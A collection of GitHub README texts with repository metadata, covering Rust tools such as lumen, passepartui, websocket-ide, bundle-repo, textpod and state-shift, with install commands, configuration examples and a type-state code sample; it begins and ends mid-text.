lumen -p openai -k ""your-api-key"" -m ""gpt-4o"" draft

# Using environment variables
export LUMEN_AI_PROVIDER=""openai""
export LUMEN_API_KEY=""your-api-key""
export LUMEN_AI_MODEL=""gpt-4o""
```

### Supported Providers

| Provider | API Key Required | Models |
|----------|-----------------|---------|
| [Phind](https://www.phind.com/agent) `phind` (Default) | No | `Phind-70B` |
| [Groq](https://groq.com/) `groq` | Yes (free) | `llama2-70b-4096`, `mixtral-8x7b-32768` (default: `mixtral-8x7b-32768`) |
| [OpenAI](https://platform.openai.com/docs/guides/text-generation/chat-completions-api) `openai` | Yes | `gpt-4o`, `gpt-4o-mini`, `gpt-4`, `gpt-3.5-turbo` (default: `gpt-4o-mini`) |
| [Claude](https://claude.ai/new) `claude` | Yes | [see list](https://docs.anthropic.com/en/docs/about-claude/models#model-names) (default: `claude-3-5-sonnet-20241022`) |
| [Ollama](https://github.com/ollama/ollama) `ollama` | No (local) | [see list](https://github.com/ollama/ollama/blob/main/docs/api.md#model-names) (required) |
| [OpenRouter](https://openrouter.ai/) `openrouter` | Yes | [see list](https://openrouter.ai/models) (default: `anthropic/claude-3.5-sonnet`) |

## Advanced Configuration üîÖ

### Configuration File
Create a `lumen.config.json` at your project root or specify a custom path with `--config`:

```json
{
  ""provider"": ""openai"",
  ""model"": ""gpt-4o"",
  ""api_key"": ""sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"",
  ""draft"": {
    ""commit_types"": {
      ""docs"": ""Documentation only changes"",
      ""style"": ""Changes that do not affect the meaning of the code"",
      ""refactor"": ""A code change that neither fixes a bug nor adds a feature"",
      ""perf"": ""A code change that improves performance"",
      ""test"": ""Adding missing tests or correcting existing tests"",
      ""build"": ""Changes that affect the build system or external dependencies"",
      ""ci"": ""Changes to our CI configuration files and scripts"",
      ""chore"": ""Other changes that don't modify src or test files"",
      ""revert"": ""Reverts a previous commit"",
      ""feat"": ""A new feature"",
      ""fix"": ""A bug fix""
    }
  }
}
```

### Configuration Precedence
Options are applied in the following order (highest to lowest priority):
1. CLI Flags
2. Configuration File
3. Environment Variables
4. Default options

Example: Using different providers for different projects:
```bash
# Set global defaults in .zshrc/.bashrc
export LUMEN_AI_PROVIDER=""openai""
export LUMEN_AI_MODEL=""gpt-4o""
export LUMEN_API_KEY=""sk-xxxxxxxxxxxxxxxxxxxxxxxx""

# Override per project using config file
{
  ""provider"": ""ollama"",
  ""model"": ""llama3.2""
}

# Or override using CLI flags
lumen -p ""ollama"" -m ""llama3.2"" draft
```
",10,3,6,MIT,,19.0
kardwen/passepartui,main,"# passepartui

<img src=""passepartui_screenshot.png"" width=""80%"">

A TUI for pass

## Introduction

I started this project as a way to practice programming in Rust while reading the [Rust Book](https://doc.rust-lang.org/stable/book/title-page.html).
Therefore, this project is still in an alpha state, however, user interaction is mostly finished.

`passepartui` relies for all decryption operations on [pass](https://www.passwordstore.org/), one-time passwords (OTP) are handled by [pass-otp](https://github.com/tadfisher/pass-otp).
Currently, no functionality for manipulating the password store (e.g. adding or deleting a password) is implemented. For those operations use `pass` directly from your terminal (refer to `man pass`).
More on the current state of development can be found below.

The name `passepartui` is a combination of ""passepartout"", French for ""master key"", and ""TUI"".

## Features

* Easy navigation with arrow keys and Vim keybindings
* Searching and filtering of passwords
* Support for viewing and copying of
  passwords and one-time passwords
* Mouse support (limited)

## Installation

### Prerequisites

* Unix (tested on Linux so far)
* `pass`, optionally `pass-otp` for one-time passwords
* Rust and cargo (when compiling from source)

### Installation from crates.io

`passepartui` can be found on [crates.io](https://crates.io/crates/passepartui).

```sh
cargo install passepartui --locked
```

Type `passepartui` to run the app (provided that `~/.cargo/bin` has been added to `$PATH`).

### Installation from the AUR

`passepartui` is available in the [AUR](https://aur.archlinux.org/packages/passepartui). You can install it with your favorite [AUR helper](https://wiki.archlinux.org/title/AUR_helpers), e.g.:

```sh
paru -S passepartui
```

### Installation from nixpkgs

`passepartui` is available in [nixpkgs](https://github.com/NixOS/nixpkgs). You
can install it in your system via the usual ways, or try it with:

```sh
nix run nixpkgs#passepartui
```

### Manual installation

Clone the repository and change to the directory:

```sh
git clone git@github.com:kardwen/passepartui.git
cd passepartui
```

Build and copy the executable to an appropriate location:

```sh
cargo build --release
cp target/release/passepartui ~/.cargo/bin
```

Run `passepartui` in a terminal.

## Contrib

The `contrib` directory contains additional files, for now an example for a desktop file.

A desktop entry lets you start `passepartui` with your application menu. Edit the desktop file `passepartui.desktop` to use your terminal emulator for running `passepartui` and copy it to `$XDG_DATA_HOME/applications` which is usually `~/.local/share/applications`.

## Development

Contributions are welcome! For architectural changes please start with opening an issue.

Build with [Ratatui](https://github.com/ratatui/ratatui).

Library: [passepartout](https://github.com/kardwen/partout)

TODO:

* General refactoring
* Tests
* Mouse support overhaul
* Localisation for last modified column
* Button animations for keyboard shortcuts

Planned for future versions:

* Background updates
* Support for symbolic links in store
* Tree view for folders (for example [Ratatui Tree Widget](https://github.com/EdJoPaTo/tui-rs-tree-widget))
* Configuration file for setting options
* Theming, e.g. for using the terminal color theme
* Decryption of password files with Rust (possibly with sequoia-openpgp).
  This would allow for
  * showing which fields are set in the password preview
  * showing all passwords at once when scrolling in the corresponding view mode (optional)
  * displaying flags for set fields in the password table
* Sorting of the password table by columns
* Improvements for running `passepartui` in TTY

Clippy:

```sh
rustup component add clippy
```

```sh
cargo clippy
cargo fmt
```
",3,0,2,GPL-3.0,,4.0
JaLnYn/websocket-ide,main,"# WIDE (websocket ide)

A lightweight code server that lets you build custom websocket-based IDEs. Built with Rust for speed and reliability. Perfect for web-based coding environments, self-hosted solutions, or custom IDE implementations.

An example browser IDE is right here: [üçå JaLnYn/browser-ide](https://github.com/JaLnYn/browser-ide) (It's ugly. Sorry!)
<img width=""1488"" alt=""image"" src=""https://github.com/user-attachments/assets/26a01a96-0d15-4d61-8799-12e0e0254663"">


## Features

- ‚ú® File operations (read/write/watch)
- üöÄ Language Server Protocol support (completion, hover, go-to-def) (only rust for now)
- üîÑ Real-time WebSocket communication
- ‚ö° Event batching for performance

## Quick Start

```bash
# Run the server
cargo run -- --workspace /your/code/path
```

### Test front-end

```
# clone the frontend test
git clone https://github.com/JaLnYn/browser-ide
cd browser-ide

# install dependencies and run front end
npm i
npm run dev
```

Note: if you want to test the lsp, you have to install rust-analyzer. Instructions [HERE](https://rust-analyzer.github.io/manual.html#rust-analyzer-language-server-binary)

```
# snippet from the site

mkdir -p ~/.local/bin
curl -L https://github.com/rust-lang/rust-analyzer/releases/latest/download/rust-analyzer-x86_64-unknown-linux-gnu.gz | gunzip -c - > ~/.local/bin/rust-analyzer
chmod +x ~/.local/bin/rust-analyzer
```

## WebSocket API

### Client Messages

| Type               | Content                                                             | Description                                                                                           |
| ------------------ | ------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `OpenFile`         | `{ path: string }`                                                  | Opens a file and returns its content. Validates file existence and readability. Notifies LSP servers. |
| `CloseFile`        | `{ path: string }`                                                  | Closes an open file, cleans up resources, and notifies LSP servers.                                   |
| `GetDirectory`     | `{ path: string }`                                                  | Retrieves directory contents at the specified path.                                                   |
| `RefreshDirectory` | `{ path: string }`                                                  | Force refreshes directory contents, clearing cache.                                                   |
| `ChangeFile`       | `{ document: { uri: string, version: number }, changes: Change[] }` | Applies changes to file content. Validates document version.                                          |
| `SaveFile`         | `{ document: { uri: string, version: number } }`                    | Saves current file content to disk.                                                                   |
| `Completion`       | `{ path: string, position: Position }`                              | Requests code completions at position.                                                                |
| `Hover`            | `{ path: string, position: Position }`                              | Requests hover information at position.                                                               |
| `Definition`       | `{ path: string, position: Position }`                              | Requests go-to-definition locations.                                                                  |
| `CreateTerminal`   | `{ cols: number, rows: number }`                                    | Creates a new terminal instance with specified dimensions                                             |
| `ResizeTerminal`   | `{ id: string, cols: number, rows: number }`                        | Resizes an existing terminal                                                                          |
| `WriteTerminal`    | `{ id: string, data: number[] }`                                    | Sends input data to terminal                                                                          |
| `CloseTerminal`    | `{ id: string }`                                                    | Closes a terminal instance                                                                            |
| `Search`           | `{ query: string, search_content: boolean }`                        | Initiates a search with optional content searching                                                    |
| `CancelSearch`     | `{}`                                                                |

### Server Messages

| Type                 | Content                                                                          | Description                   |
| -------------------- | -------------------------------------------------------------------------------- | ----------------------------- |
| `DirectoryContent`   | `{ path: string, content: FileNode[] }`                                          | Directory listing             |
| `DocumentContent`    | `{ path: string, content: string, metadata: DocumentMetadata, version: number }` | File content                  |
| `FileSystemEvents`   | `{ events: FileEvent[] }`                                                        | Real-time file system changes |
| `CompletionResponse` | `{ completions: CompletionList }`                                                | LSP completion items          |
| `HoverResponse`      | `{ hover: Hover }`                                                               | LSP hover information         |
| `DefinitionResponse` | `{ locations: Location[] }`                                                      | LSP definition locations      |
| `ChangeSuccess`      | `{ document: { version: number } }`                                              | Confirms file changes         |
| `SaveSuccess`        | `{ document: { version: number } }`                                              | Confirms file save            |
| `Error`              | `{ message: string }`                                                            | Error details                 |
| `Success`            | `{}`                                                                             | Generic success               |
| `TerminalCreated`    | `{ terminal_id: string }`                                                        | Confirms terminal creation    |
| `TerminalOutput`     | `{ terminal_id: string, data: number[] }`                                        | Terminal output data          |
| `TerminalClosed`     | `{ id: string }`                                                                 | Confirms terminal closure     |
| `TerminalError`      | `{ terminal_id: string, error: string }`                                         | Terminal error details        |
| `SearchResults`      | `{ search_id: string, items: SearchResultItem[], is_complete: boolean }`         | Search results batch.         |

## Todo

- [ ] Debugger support
- [x] Search
- [x] Websocket based terminal
- [ ] More LSP features
- [ ] Testing
- [ ] Documentation improvements
- [ ] Better error handling
- [ ] Multi-root workspace support
- [ ] Clean up

## Contributing

I'm actively working on this project and welcome any contributions! Feel free to:

- Implementing new features
- Making things faster
- Adding tests
- Improving docs
- Making the code prettier
- Adding cool stuff we haven't thought of

---

Built with ü¶Ä by someone who love coding on gpu servers.
",0,2,3,MIT,,2.0
seapagan/bundle-repo,main,"# BundleRepo <!-- omit in toc -->

**BundleRepo** is a beta tool designed to clone and pack a local or remote
(GitHub only for now) Git repository into a comprehensive XML file. The packed
XML includes detailed metadata about each file, such as the size in bytes and
the number of lines, making it suitable for large language model (LLM)
consumption, code analysis, and repository review.

XML was chosen for the file output format since it is very well structured and
LLM models can easily parse it (better than a plain-text dump).

It is inspired by [Repopack](#acknowledgements) which is a great tool, but is
written in TypeScript and needs a Node.js environment to run. Eventually this
project will produce binaries and not need Rust installed to run.

The generated XML metadata and structure are inspired by the output of Repopack
(a lot of the header text was taken from there), with enhancements that include
additional file attributes, instructions for the LLM and a more robust
structure. At this time `xml` output is the only supported output format,
however future versions may include additional formats.

> [!TIP]
>
> XML was chosen as the default output format since it is very well structured
> and LLM models can easily parse it (better than a plain-text dump - see this
> [link][why-xml] from Anthropic as to why XML is a superior format for feeding
> context and instructions into an LLM).

```pre
BundleRepo Version 0.3.0, ¬© 2024 Grant Ramsay <seapagan@gmail.com>

Pack a local or remote Git Repository to XML for LLM Consumption.

-> Found a git repository in the current directory: '/home/seapagan/data/work/own/bundle-repo' (branch: add-config-file)
-> Successfully wrote XML to 'packed-repo.xml'

Summary:
     Total Files processed:  13
 Total output size (bytes):  79068
      Token count (GPT-4o):  18766
```

- [Compatibility](#compatibility)
- [Features](#features)
- [Usage](#usage)
  - [Installation](#installation)
  - [Running the Tool](#running-the-tool)
    - [Specify the branch for a remote Git repository](#specify-the-branch-for-a-remote-git-repository)
  - [Output](#output)
    - [Output to File](#output-to-file)
    - [Output to stdout](#output-to-stdout)
    - [Copy to Clipboard](#copy-to-clipboard)
    - [Add line numbers](#add-line-numbers)
  - [Choose Model for Token Count](#choose-model-for-token-count)
  - [GitHub Token](#github-token)
- [Command Line Options](#command-line-options)
- [Configuration File](#configuration-file)
- [Ignored Files](#ignored-files)
- [Planned Improvements](#planned-improvements)
- [XML Layout](#xml-layout)
- [Beta Status](#beta-status)
- [Acknowledgements](#acknowledgements)
- [License](#license)

## Compatibility

The tool is designed and tested to work on Linux, MacOS, and Windows (Windows 10
and 11 tested).

## Features

- **Clone Git Repositories**: Supports cloning both public and private
  repositories (with token support). Only supports `https` URLs at this time.
- **File Scanning**: Automatically scans the repository and adds all files to
  the output, excluding standard ignored files (e.g. `.gitignore`, `LICENSE`,
  etc).

> [!NOTE]
>
> Any file listed in a `.gitignore` file will be excluded from the output and
> metadata.
>
> Binary file content will always be excluded, though they will be listed in the
> `<repository_structure>` node and a `<file>` node will be created in the XML
> to show that the file was excluded and why.
>
> See [Ignored Files](#ignored-files) for a full list of excluded files.

- **Metadata Extraction**: For each file, the XML output includes:
  - `path`: the file path relative to the repository root
  - `size`: file size in bytes
  - `lines`: number of lines in the file
  - Raw file content (not escaped)
- **Token Count**: Calculates the number of tokens in the final XML file, based
  on the specified model (default is GPT-4o). Only OpenAI models are supported
  at this time, though I may add support for others in the future.
- **XML Output**: Generates an XML file (`packed-repo.xml`) that contains the
  entire repository structure and file details.
- **Global and local configuration files**: Allows you to set default values
  globally and override them on a per-project basis. All settings can be further
  overridden by command line options.

This tool is currently under active development, and more features will be
implemented quickly. Please **star** this repository to stay updated on new
releases and features.

## Usage

This will be available as a binary download in the future, but for now, you can
build it from source or install from `crates.io`. You will need to have
[Rust](https://www.rust-lang.org/tools/install) installed on your system to
build the project.

### Installation

Clone the project and install dependencies.

- From [crates.io][crates-io-page]:

  ```bash
  cargo install bundle_repo
  ```

- From source:

  ```bash
  git clone https://github.com/seapagan/bundle-repo.git
  cd bundle-repo
  cargo build --release
  ```

  Move the resulting binary to a directory in your `PATH`:

  eg for Linux or MacOS:

  ```bash
  sudo mv ./target/release/bundlerepo /usr/local/bin
  ```

### Running the Tool

Use the GitHub short form:

```bash
bundlerepo user_name/repo_name
```

Use the full URL:

```bash
bundlerepo https://github.com/user_name/repo_name
```

Or use the current directory (if it is a git repository):

```bash
bundlerepo
```

> [!IMPORTANT]
>
> Only the `https` protocol is supported at this time. The tool will not yet
> work with `ssh` URLs (ie **not** `git@github.com:seapagan/bundle-repo.git`)

> [!NOTE]
>
> The tool will actually bundle **any** files in the current directory (unless
> they are in the hard-coded ignore list). This can probably be useful for
> bundling any related files that you wish to feed to an AI. However, you may
> need to edit the `<purpose>` and `<instructions>` nodes in the output XML. I
> may add a flag to make this easier in the future (`--not-code` or something).
>
> However, it still needs to be an actual git repository or the code will exit.
> I may add a flag to allow non-git repositories in the future.

#### Specify the branch for a remote Git repository

If you want to specify a branch for a remote repository, you can do so using the
`--branch` or `-b` flag:

```bash
bundlerepo user_name/repo_name --branch my_branch
```

Without this flag, the default branch will be used, which is usually `main` or
`master`.

> [!NOTE]
>
> The `--branch` option only works for **remote repositories**. It has no effect
> when bundling a local repository. If you want to bundle a local repository
> with a specific branch, you will need to check out that branch before running
> the tool.

### Output

#### Output to File

This is the default operation of the tool, the XML output will be written to
`packed-repo.xml`, which contains the hierarchical structure and metadata of the
repository files. This can then be passed to an LLM model for analysis (for
example, attach the output file to a ChatGPT or Claude prompt).

The filename can be changed using the `--file` or `-f` flag:

```bash
bundlerepo user_name/repo_name --file my-repo.xml
```

The output file will be written to the current directory unless a path is
specified:

```bash
bundlerepo user_name/repo_name --file /path/to/output.xml
```

#### Output to stdout

You can output the XML to the terminal by using the `--stdout` or `-s` flag:

```bash
bundlerepo user_name/repo_name --stdout
```

This will print the XML output to the terminal, which can then be redirected to
a file or piped to another application.

In this case, the `--file` flag is ignored and no file is written to disk.

#### Copy to Clipboard

You can copy the XML output to the clipboard by using the `--clipboard` or `-c`
flag:

```bash
bundlerepo user_name/repo_name --clipboard
```

This will copy the XML output to the clipboard, which can then be pasted into
another application or file, or indeed directly into an LLM prompt. Note that it
is likely to be a large amount of text, so ensure your clipboard can handle it.

In this case, the `--file` flag is ignored and no file is written to disk.

#### Add line numbers

If you want to add line numbers to the output, you can use the `--lnumbers` or
`-l` flag:

```bash
bundlerepo user_name/repo_name --lnumbers
```

This will add line numbers physically to each line in the output, which can be
useful for debugging or analysis. Note that this will increase the token count
of the output, so be aware of that when using it. Extra info for the LLM will be
added to the `<instructions>` node to explain the line numbers.

### Choose Model for Token Count

After generating the xml file, the tool gives a count of the number of tokens in
the file, to give you an idea of context usage and costs. By default it
calculates the number of tokens for the GPT-4o model, but you can specify
another model using the `--model` or `-m` flag:

```bash
bundlerepo user_name/repo_name --model gpt3.5
```

Valid models are `gpt4o`, `gpt4`, `gpt3.5`, `gpt3` and `gpt2`. It is important
to use the correct model, as the token count is vastly different between the 3
and 4 series models.

> [!NOTE]
>
> Only OpenAI models are supported at this time, since the code uses the
> `tiktoken` library from OpenAI to count the tokens. I may add support for
> other models in the future, if I can find a decent library that supports them.
>
> Currently, the count returned by this tool is identical to that returned by
> their [web app](https://platform.openai.com/tokenizer).

### GitHub Token

For **private repositories**, or to bypass usage restrictions, you can provide a
GitHub token to access the repository. You can create a token by following the
instructions
[here](https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token).

Once you have the token, you can pass it to the tool using the `--token` flag:

```bash
bundlerepo user_name/repo_name --token YOUR_GITHUB_TOKEN
```

> [!TIP]
>
> Passing a token is totally optional if you are only using public repositories.

## Command Line Options

The full list of command line options can be seen by running with the `--help`
flag:

```pre
Pack a local or remote Git Repository to XML for LLM Consumption.

Usage: bundlerepo [OPTIONS] [REPO]

Arguments:
  [REPO]  GitHub repository to clone (e.g. 'user/repo' or full GitHub URL). If not provided, the current directory will be searched for a Git repository.

Options:
  -b, --branch <BRANCH>     Specify a branch to checkout for remote repositories
  -f, --file <OUTPUT_FILE>  Filename to save the bundle as. [default: packed-repo.xml]
  -s, --stdout              Output the XML directly to stdout without creating a file.
  -m, --model <MODEL>       Model to use for tokenization. Supported models: 'gpt4o', 'gpt4', 'gpt3.5', 'gpt3', 'gpt2' [default: gpt4o]
  -c, --clipboard           Copy the XML to the clipboard after creating it.
  -l, --lnumbers            Add line numbers to each code file in the output.
  -t, --token <TOKEN>       GitHub personal access token (required for private repos and to pass rate limits)
  -e, --extend-exclude <PATTERN>  Additional file pattern to exclude (can be specified multiple times)
  -x, --exclude <PATTERN>   File pattern to exclude, replacing the default ignore list (can be specified multiple times)
  -V, --version            Print version information and exit
  -h, --help               Print help
```

## Configuration File

The tool supports two configuration files:

- Global config at `~/.config/bundlerepo/config.toml`
- Local config at `.bundlerepo.toml` in your current directory

This allows you to set default values globally and override them on a
per-project basis. All settings can be further overridden by command line
options.

The configuration files use TOML format. Here's an example configuration:

```toml
# ~/.config/bundlerepo/config.toml or .bundlerepo.toml
output_file = ""my-default-output.xml""
model = ""gpt3.5""
stdout = false
clipboard = false
line_numbers = true
token = ""your-github-token""
extend_exclude = [""*.md"", ""*.txt"", ""docs/*""]  # Additional patterns to exclude
exclude = [""*.exe"", ""*.dll"", ""node_modules/*""]  # File patterns to exclude
```

All settings are optional. Settings are applied in the following order of
precedence (highest to lowest):

1. Command line options
2. Local config file (`.bundlerepo.toml`)
3. Global config file (`~/.config/bundlerepo/config.toml`)
4. Built-in defaults

Available configuration options:

- `output_file`: Default output filename (default: ""packed-repo.xml"")
- `model`: Default model for token counting (default: ""gpt4o"")
- `stdout`: Whether to output to stdout by default (default: false)
- `clipboard`: Whether to copy to clipboard by default (default: false)
- `line_numbers`: Whether to add line numbers by default (default: false)
- `token`: Your GitHub personal access token (default: none)
- `extend_exclude`: Additional file patterns to exclude (default: none)
- `exclude`: File patterns to exclude, replacing the default ignore list
  (default: none)

The `extend_exclude` and `exclude` options can be specified either by using
multiple `-e` or `-x` flags on the command line:

```bash
bundlerepo user/repo -e ""*.md"" -e ""*.txt"" -e ""docs/*""
bundlerepo user/repo -x ""*.exe"" -x ""*.dll"" -x ""node_modules/*""
```

Or as arrays in the TOML configuration file:

```toml
extend_exclude = [""*.md"", ""*.txt"", ""docs/*""]
exclude = [""*.exe"", ""*.dll"", ""node_modules/*""]
```

The `extend_exclude` patterns will be **added** to the default ignore list,
while the `exclude` patterns will **replace** the default ignore list entirely.

> [!IMPORTANT]
>
> When the `exclude` option is used (either via command line or config file),
> both the default ignore list and any `extend_exclude` patterns are completely
> ignored. The `exclude` patterns become the only ignore rules in effect.

> [!TIP]
>
> The `extend_exclude` option is useful for excluding additional files that
> aren't in the default ignore list but that you don't want to include in your
> XML output. The `exclude` option gives you complete control over what files
> are ignored, replacing the built-in ignore list. Both options can help reduce
> token usage and remove irrelevant files from the LLM context.
>
> Storing your GitHub token in the configuration file can be more convenient
> than passing it via command line, especially if you frequently work with
> private repositories. Just be sure to keep your configuration file secure.

## Ignored Files

The tool will ignore the following files by default and (except for binary, see
below) they will not be listed anywhere in the XML output:

- **ANY Binary File**. If you have a binary file in your repository, it will be
  listed in the XML output, but the content will be excluded.
- `.gitignore`
- any file **listed** in a `.gitignore` file
- `.git` folder and it's contents
- `.github` folder and it's contents
- Python requirements files (`requirements.txt`, `requirements-dev.txt`, etc)
- Lockfiles - any file ending in `.lock`
- `renovate.json`
- `license` files (e.g. `LICENSE`, `LICENSE.md`, etc)
- `.vscode` folder and it's contents

This list is hard-coded (and to be honest is tuned to my current workflow) and
cannot be changed at this time. However, that will be changed once the
configuration file functionality is added.

> [!TIP]
>
> I'm very open to adding other files that should be ignored by default, If you
> have a suggestion, please open a PR or an Issue on GitHub. For example, tool
> configuration files (eslintrc, prettierrc, etc), which are not needed by an
> LLM and just take up token space.
>
> If there is demand, I may add a flag to allow the user to bypass this list and
> include all files. However, binary files will always be excluded as they don't
> fit well in XML.

## Planned Improvements

You can find planned improvements and known issues etc in the [TODO.md](TODO.md)
file.

## XML Layout

The generated `packed-repo.xml` follows a structured format that can be easily
understood by an LLM. Below is an example layout with explanations for each tag:

```xml
<repository>
  <file_summary>
    <!-- Metadata describing the purpose and file structure of the packed repository -->
    <!-- It also contains some instructions to help the LLM properly decode and understand the data -->
  </file_summary>

  <repository_structure>
    <summary>
      <!-- A brief summary of the folder structure in the repository -->
    </summary>
    <folder name=""src"">
      <!-- Folders contain nested folders and files -->
      <file path=""main.rs"">
        <!-- Files are listed by path relative to the repository root -->
      </file>
    </folder>
  </repository_structure>

  <repository_files>
    <summary>
      <!-- A summary of the files and their contents -->
    </summary>
    <file path=""src/main.rs"" size=""1474"" lines=""53"">
      <!-- For each file, the path, size in bytes, and number of lines are provided -->
      <!-- Full file contents are included here -->
    </file>
  </repository_files>
</repository>
```

## Beta Status

> [!WARNING]
>
> This tool is currently in **beta**. While the core functionality works, there
> may be edge cases or features yet to be fully refined. Feedback and
> contributions are welcome to improve and stabilize the tool.
>
> There is a pressing need for a test suite to ensure the tool works as expected
> in a variety of scenarios. This is a priority for the next release.

## Acknowledgements

**Bundle Repo** is a rewrite of the original
[Repopack](https://github.com/yamadashy/repopack) project, though none of the
source code was used or even looked at (the output file header however was
heavily borrowed from). The idea was to create a similar tool from scratch, with
a few enhancements and improvements. It's also part of my journey to learn Rust
and build useful tools for all.

## License

This project is licensed under the MIT License.

```pre
The MIT License (MIT)
Copyright (c) 2024 Grant Ramsay

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE
OR OTHER DEALINGS IN THE SOFTWARE.
```

[why-xml]:
  https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering/use-xml-tags
[crates-io-page]: https://crates.io/crates/bundle_repo
",4,3,3,,"release.yml,test.yml",15.0
DGVPSH/SlackOpen,main,"# Slack Client Open SRC

## Maintained by Dg636

## Join the discord: https://discord.gg/gQTKhPwEhK",10,2,1,,,0.0
freetonik/textpod,main,"[![textpod build status on GNU/Linux](https://github.com/freetonik/textpod/workflows/GNU%2FLinux/badge.svg)](https://github.com/freetonik/textpod/actions?query=workflow%3AGNU%2FLinux)
[![textpod build status on macOS](https://github.com/freetonik/textpod/workflows/macOS/badge.svg)](https://github.com/freetonik/textpod/actions?query=workflow%3AmacOS)
[![textpod build status on Windows](https://github.com/freetonik/textpod/workflows/Windows/badge.svg)](https://github.com/freetonik/textpod/actions?query=workflow%3AWindows)

# Textpod

Local, web-based note-taking app inspired by ""One Big Text File"" idea. Short demo:

[![Textpod short demo video](https://img.youtube.com/vi/VAqJJxaJNVM/0.jpg)](https://www.youtube.com/watch?v=VAqJJxaJNVM)

- Single page with all notes and a simple entry form (Markdown)
- All notes are stored in a single `notes.md` file
- Search/filtering when you start typing with `/`
- Start a link with `+` and Textpod will save a local single-page copy
- File and image attachments

## Installation

#### Using [Cargo](https://crates.io/crates/textpod) (cross-platform)

```console
cargo install textpod
```

#### Via [Homebrew](https://brew.sh/) (macOS and GNU/Linux)

```console
brew tap freetonik/tap
brew install textpod
```

In order to download webpages, you need to have `monolith` installed. `cargo install monolith` or `brew install monolith` (macOS). See [monolith](https://github.com/Y2Z/monolith) for more details.

## Usage

Run `textpod` in any directory. It will create a `notes.md` file if it doesn't exist. It will create `attachments` directory for file and image attachments.
Webpages are saved in `attachments/webpages`. You can specify the port with `-p` flag, e.g. `textpod -p 8080` and/or the address with `-l` flag, e.g. `textpod -l 0.0.0.0`.

## Docker

Docker image is available at [Docker Hub](https://hub.docker.com/r/freetonik/textpod).
E.g. run on port `8099`, mapping the `notes` directory (under current directory):

```
docker pull freetonik/textpod
docker run --rm --name textpod -d -v $(pwd)/notes:/app -p 8099:3000 freetonik/textpod
```

Or check out `docker-compose.yml`.

## Contributing

Feel free to open issues and pull requests. I want to keep the code very simple and accessible to beginners. The goal is not to create another feature-rich note-taking app, but to keep it simple and fast.
A ""one big text file"" idea is very powerful and I just want to make it slightly enhanced.
",4,5,7,GPL-3.0,"build_gnu_linux.yml,build_macos.yml,build_windows.yml,cd.yml,ci.yml",15.0
ozgunozerk/state-shift,main,"# With and Without State-Shift:

state-shift let's you convert your structs and methods into type-state version, without the ugly code.

If `type-state-pattern` didn't sound familiar, scroll to [What the hell is even Type-State-Pattern?](#what-the-hell-is-even-type-state-pattern)

Say, you want to build a player, and some fields need to be set before the others. In short, a classic type-state-pattern example...

> [!WARNING]
> Below are the comparison codes with and without state-shift. If you don't like reading huge chunks of code like me, scroll a bit down to see the [chunk by chunk comparison](#lets-break-it-down)

## Full Code Comparison:

> [!CAUTION]
> A simple Type-State `PlayerBuilder` example WITHOUT state-shift:

```rust
use core::marker::PhantomData;

struct PlayerBuilder<State1 = Initial> {
    race: Option<Race>,
    level: Option<u8>,
    skill_slots: Option<u8>,
    _state: PhantomData<fn() -> State1>,
}

mod sealed {
    pub trait Sealed {}
}

pub trait TypeStateProtector: sealed::Sealed {}

struct Initial;
struct RaceSet;
struct LevelSet;
struct SkillSlotsSet;

impl sealed::Sealed for Initial {}
impl sealed::Sealed for RaceSet {}
impl sealed::Sealed for LevelSet {}
impl sealed::Sealed for SkillSlotsSet {}

impl TypeStateProtector for Initial {}
impl TypeStateProtector for RaceSet {}
impl TypeStateProtector for LevelSet {}
impl TypeStateProtector for SkillSlotsSet {}


impl PlayerBuilder<Initial> {
    fn new() -> Self {
        PlayerBuilder {
            race: None,
            level: None,
            skill_slots: None,
            _state: (PhantomData),
        }
    }


    fn set_race(self, race: Race) -> PlayerBuilder<RaceSet> {
        PlayerBuilder {
            race: Some(race),
            level: self.level,
            skill_slots: self.skill_slots,
            _state: (PhantomData),
        }
    }
}

impl PlayerBuilder<RaceSet> {
    fn set_level(self, level_modifier: u8) -> PlayerBuilder<LevelSet> {
        let level = match self.race {
            Some(Race::Orc) => level_modifier + 2, // Orc's have +2 level advantage
            Some(Race::Human) => level_modifier,   // humans are weak
            None => unreachable!(""type safety ensures that `race` is initialized""),
        };

        PlayerBuilder {
            race: self.race,
            level: Some(level),
            skill_slots: self.skill_slots,
            _state: (PhantomData),
        }
    }
}

impl PlayerBuilder<LevelSet> {
    fn set_skill_slots(self, skill_slot_modifier: u8) -> PlayerBuilder<SkillSlotsSet> {
        let skill_slots = match self.race {
            Some(Race::Orc) => skill_slot_modifier,
            Some(Race::Human) => skill_slot_modifier + 1, // Human's have +1 skill slot advantage
            None => unreachable!(""type safety ensures that `race` should be initialized""),
        };

        PlayerBuilder {
            race: self.race,
            level: self.level,
            skill_slots: Some(skill_slots),
            _state: (PhantomData),
        }
    }
}

impl<A> PlayerBuilder<A>
where
    A: TypeStateProtector,
{
    fn say_hi(self) -> Self {
        println!(""Hi!"");
        self
    }
}

impl PlayerBuilder<SkillSlotsSet> {
    fn build(self) -> Player {
        Player {
            race: self.race.expect(""type safety ensures this is set""),
            level: self.level.expect(""type safety ensures this is set""),
            skill_slots: self.skill_slots.expect(""type safety ensures this is set""),
        }
    }
}

#[derive(Debug)]
struct Player {
    race: Race,
    level: u8,
    skill_slots: u8,
}

#[derive(Debug, PartialEq)]
enum Race {
    Orc,
    #[allow(unused)]
    Human,
}

fn main() {
    let player = PlayerBuilder::new()
        .set_race(Race::Orc)
        .set_level(1)
        .set_skill_slots(1)
        .say_hi()
        .build();
    println!(""Race: {:?}"", player.race);
    println!(""Level: {}"", player.level);
